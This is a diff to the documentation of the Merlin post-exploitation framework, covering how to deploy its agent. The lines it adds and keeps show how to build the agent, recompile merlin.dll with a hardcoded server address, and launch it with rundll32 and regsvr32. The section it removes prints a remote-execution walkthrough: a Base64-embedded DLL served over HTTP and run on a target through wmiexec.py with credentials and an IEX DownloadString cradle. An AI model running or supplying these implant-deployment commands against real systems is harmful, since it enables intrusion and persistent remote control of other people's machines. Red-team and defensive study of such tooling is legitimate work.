@@ -8,6 +8,12 @@ Merlin is a post-exploitation framework and therefore documentation doesn't cove
 
 | **Pre-compiled Merlin Agent binary files are distributed with the server download in the** ``data/bin/`` **directory of Merlin**
 
+The Merlin Agent source code can be found https://github.com/Ne0nd0g/merlin-agent
+
+Retrieve with Go and build the Agent::
+
+    go get github.com/Ne0nd0g/merlin-agent
+
 ----------------
 Upload & Execute
 ----------------
@@ -103,7 +109,7 @@ Advanced
 
 The quick start examples above executed the Merlin agent and allowed the user to dynamically specify the location of the listening Merlin server with a command line parameter. There are a few instances where we the user is unable to specify, or simply don't want to, the URL for the listening Merlin server. In this case, the Merlin agent binary should be recompiled with a hardcoded URL of the listening Merlin server so that it does not need to be specified by the user during execution. *Do not continue on unless you are OK to deal with things that sometimes work and often have bugs and are not reliable.*
 
-| This will require that you have Go and gcc installed on the host compiling the application. View the DLL's `README <https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/dll/README.MD>`_ for additional information.
+| This will require that you have Go and gcc installed on the host compiling the application
 
 Recompile DLL
 ^^^^^^^^^^^^^
@@ -111,20 +117,19 @@ Recompile DLL
 The `merlin.dll` file can be configured with the hardcoded url of your Merlin server. To do this, clone the repo, modify the file, and recompile it.
 
 1. Clone the merlin repository using git
-2. Edit the file at `cmd/merlinagentdll/main.go`
+2. Edit the `main.go` file
 3. Find the string `var url = "https://127.0.0.1:443/"` and change the address
 4. Compile the DLL
 
 example::
 
     cd /opt
-    git clone -b dev https://github.com/Ne0nd0g/merlin.git
-    cd merlin
-    sed -i 's_https://127.0.0.1:443/_https://192.168.1.100:443/_' cmd/merlinagentdll/main.go
-    make agent-dll
+    git clone -b dev https://github.com/Ne0nd0g/merlin-agent-dll.git
+    cd merlin-agent-dll
+    sed -i 's_https://127.0.0.1:443/_https://192.168.1.100:443/_' main.go
+    make
 
-
-This will leave the `merlin.dll` in the `data/temp/v0.5.0/` directory where `v0.5.0` is the current version number of Merlin. Now the recompdiled version of the DLL can be run without having to specify the address of the Merlin server.
+This will leave the `merlin.dll` in the `bin/v0.5.0/` directory where `v0.5.0` is the current version number of Merlin. Now the recompiled version of the DLL can be run without having to specify the address of the Merlin server.
 
 rundll32.exe examples:
 
@@ -139,43 +144,3 @@ regsvr32.exe examples:
 * ``regsvr32.exe /s /u merlin.dll``
 
 * ``regsvr32.exe /s /n /i merlin.dll``
-
-PowerShell - Invoke-Merlin.ps1
-^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-
-| **WARNING: This script is very unstable**
-
-The ``Invoke-Merlin.ps1`` PowerShell script can be found in the ``data/bin/powershell`` directory. This script leverages the work done by the PowerSploit team to reflectively load  `merlin.dll` into memory. View the `README <https://github.com/Ne0nd0g/merlin/blob/dev/data/bin/powershell/README.MD>`__ for additional details. By default, Invoke-Merlin connects to `https://127.0.0.1:443/`. At the time of this writing, I have not found a way to provide an argument of the listening Merlin server's address when calling the DLL. Therefore, this requires recompiling the DLL with the hardcoded address of the listening Merlin server as shown in the *Recompile DLL* section above. The `Invoke-Merlin.ps1` script needs to be updated with the Base64 encoded version of the new recompiled `merlin.dll` file. The quickest way to update Invoke-Merlin.ps1 is to use the set commands below from a PowerShell terminal.
-
-* Read the DLL into a variable:
-
- ``$PEBytes = [IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')``
-
-* Base64 encode the DLL and save it in another variable:
-
-  ``$Base64String = [System.Convert]::ToBase64String($PEBytes)``
-
-* Update the existing Invoke-Merlin.ps1 script with the Base64 encoded version of the newly compiled DLL:
-
-  ``(Get-Content data/bin/powershell/Invoke-Merlin.ps1) | foreach-object {$_ -replace '^\$global\:merlin \= (.*)', ('$global:merlin = ' + "'" + $Base64String + "'")} | Set-Content data/bin/powershell/Invoke-Merlin.ps1``
-
-Now the Invoke-Merlin script is ready to be downloaded and executed. Fair warning, the script can be extremely executing the call back to the listening Merlin server. Give it a couple of minutes before rage quitting. Additionally, the `-ForceASLR` flag for Invoke-Merlin.ps1 is required to circumvent other errors that arise when executing the script. Host the Invoke-Merlin.ps1 script on any web server and use a PowerShell download cradel to execute it on the remote host.
-
-Python's `SimpleHTTPServer` module can be used to quickly host the file. Move into the directory where you have a copy of the updated Invoke-Merlin.ps1 script and run the Python module.
-
-python SimpleHTTPServer example::
-
-    python -m SimpleHTTPServer 80
-
-Now the script can be downloaded and executed on a remote host using a tool like Impacket's wmiexec.py.
-
-wmiexec.py example::
-
-    root@kali:/opt/impacket/examples# python wmiexec.py bob:password@192.168.1.92 "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/Invoke-Merlin.ps1');Invoke-Merlin -ForceASLR"
-    Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies
-
-    [*] SMBv2.1 dialect used
-
-    ^C[-]
-    root@kali:/opt/impacket/examples#
-
